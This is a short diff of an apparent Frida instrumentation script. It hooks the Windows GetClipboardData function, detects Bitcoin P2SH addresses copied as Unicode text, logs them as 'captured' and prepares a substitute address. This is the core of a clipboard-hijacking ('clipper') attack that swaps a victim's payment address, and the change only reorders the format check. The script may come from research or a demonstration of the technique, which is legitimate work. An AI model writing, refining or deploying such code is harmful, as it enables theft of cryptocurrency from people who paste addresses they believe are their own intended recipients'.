@@ -9,9 +9,9 @@ Interceptor.attach(user32_GetClipboardData, {
         var formatName = getClipboardFormatName(this.uFormat);
         console.log(`[+] GetClipboardData(${formatName}) => ${retval}`);
         
-        if (!retval.isNull()) {
+        if (!retval.isNull() && formatName == 'CF_UNICODETEXT') {
           var original = retval.readUtf16String();
-          if (formatName == 'CF_UNICODETEXT' && isValidP2SHAddress(original)) {
+          if (isValidP2SHAddress(original)) {
             console.log("[+] Captured address: " + original);
             const modified = '3ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456';
             console.log("[+] Modified address: " + modified);
